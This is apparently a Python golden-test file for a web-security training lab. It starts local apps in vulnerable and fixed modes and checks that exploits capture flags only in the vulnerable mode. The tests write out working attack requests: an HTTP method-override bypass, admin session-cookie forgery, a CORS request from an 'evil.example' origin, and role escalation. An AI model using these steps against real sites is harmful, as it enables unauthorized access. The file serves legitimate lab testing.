"""Wave 1 golden tests: each target exploited in vuln MODE, blocked in fixed MODE.
No docker needed — apps run as subprocesses (stdlib only)."""
import base64
import json
import os
import subprocess
import sys
import time
import urllib.request

REPO = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
sys.path.insert(0, os.path.join(REPO, "packages", "lab-sdk"))
from flag import verify  # noqa: E402

SEED, SID = "golden-seed-1234", "s-golden"
PORTS = {"web-http-01": 41201, "web-cookies-01": 41202, "web-headers-01": 41203,
         "web-authz-01": 41204, "web-report-01": 41205}

def req(port, path, method="GET", body=None, headers=None):
    r = urllib.request.Request(f"http://127.0.0.1:{port}{path}", method=method,
                               data=json.dumps(body).encode() if body is not None else None,
                               headers={"Content-Type": "application/json", **(headers or {})})
    try:
        with urllib.request.urlopen(r, timeout=5) as resp:
            return resp.status, dict(resp.headers), json.loads(resp.read() or b"{}")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), json.loads(e.read() or b"{}")

def start(slug, mode):
    port = PORTS[slug]
    env = dict(os.environ, SESSION_SEED=SEED, SESSION_ID=SID, LAB_MODE=mode,
               PORT=str(port), PYTHONPATH=os.path.join(REPO, "packages", "lab-sdk"))
    p = subprocess.Popen([sys.executable, os.path.join(REPO, "labs", "kingaweb-native", slug, "app.py")],
                         env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    for _ in range(50):
        try:
            if req(port, "/healthz")[0] == 200:
                return p
        except Exception:
            pass
        time.sleep(0.2)
    p.kill()
    raise RuntimeError(f"{slug} did not start")

def stop(p):
    p.terminate()
    try:
        p.wait(timeout=5)
    except Exception:
        p.kill()

def run(slug, mode, fn):
    p = start(slug, mode)
    try:
        fn(PORTS[slug])
    finally:
        stop(p)

def test_http_override():
    def vuln(port):
        assert req(port, "/note?text=HACKED", headers={"X-HTTP-Method-Override": "POST"})[0] == 200
        s, _, b = req(port, "/flag")
        assert s == 200 and verify(b["flag"], SID, SEED, "override-note")
    def fixed(port):
        assert req(port, "/note?text=HACKED", headers={"X-HTTP-Method-Override": "POST"})[0] in (200, 404)
        assert req(port, "/flag")[0] == 403
    run("web-http-01", "vuln", vuln)
    run("web-http-01", "fixed", fixed)

def test_cookie_forge():
    def forge(port):
        s, h, _ = req(port, "/login")
        assert s == 200
        raw = [v for k, v in h.items() if k.lower() == "set-cookie"][0].split("session=")[1].split(";")[0]
        admin = base64.urlsafe_b64encode(json.dumps({"user": "admin"}).encode()).decode()
        s, _, b = req(port, "/admin", headers={"Cookie": f"session={admin}"})
        assert s == 200 and verify(b["flag"], SID, SEED, "become-admin")
    def fixed(port):
        s, h, _ = req(port, "/login")
        raw = [v for k, v in h.items() if k.lower() == "set-cookie"][0].split("session=")[1].split(";")[0]
        admin = base64.urlsafe_b64encode(json.dumps({"user": "admin"}).encode()).decode()
        assert req(port, "/admin", headers={"Cookie": f"session={admin}"})[0] == 403
    run("web-cookies-01", "vuln", forge)
    run("web-cookies-01", "fixed", fixed)

def test_cors():
    def vuln(port):
        s, h, b = req(port, "/api/data", headers={"Origin": "https://evil.example"})
        assert h.get("Access-Control-Allow-Origin") in ("https://evil.example", "*")
        s, _, b = req(port, "/cors/flag", headers={"Origin": "https://evil.example", "Cookie": "session=x"})
        assert s == 200 and verify(b["flag"], SID, SEED, "cors-steal")
    def fixed(port):
        s, h, _ = req(port, "/api/data", headers={"Origin": "https://evil.example"})
        assert h.get("Strict-Transport-Security", "").startswith("max-age")
        assert req(port, "/cors/flag", headers={"Origin": "https://evil.example", "Cookie": "session=x"})[0] == 403
    run("web-headers-01", "vuln", vuln)
    run("web-headers-01", "fixed", fixed)

def test_authz():
    def vuln(port):
        _, _, b = req(port, "/login", method="POST", body={"username": "user", "password": "user"})
        tok = b["token"]
        s, _, _ = req(port, "/api/users/user/role", method="POST", body={"role": "admin"},
                       headers={"Authorization": f"Bearer {tok}"})
        assert s == 200
        s, _, b = req(port, "/admin/flag", headers={"Authorization": f"Bearer {tok}"})
        assert s == 200 and verify(b["flag"], SID, SEED, "escalate-role")
    def fixed(port):
        _, _, b = req(port, "/login", method="POST", body={"username": "user", "password": "user"})
        s, _, _ = req(port, "/api/users/user/role", method="POST", body={"role": "admin"},
                       headers={"Authorization": f"Bearer {b['token']}"})
        assert s == 403
    run("web-authz-01", "vuln", vuln)
    run("web-authz-01", "fixed", fixed)

def test_report():
    def both(port):
        assert req(port, "/findings", method="POST", body={"description": "x"})[0] == 422
        full = {k: f"substantive {k} content here" for k in
                ["description", "evidence", "impact", "cwe", "remediation", "retest"]}
        s, _, b = req(port, "/findings", method="POST", body=full)
        assert s == 200 and verify(b["flag"], SID, SEED, "write-finding")
    run("web-report-01", "vuln", both)
    run("web-report-01", "fixed", both)
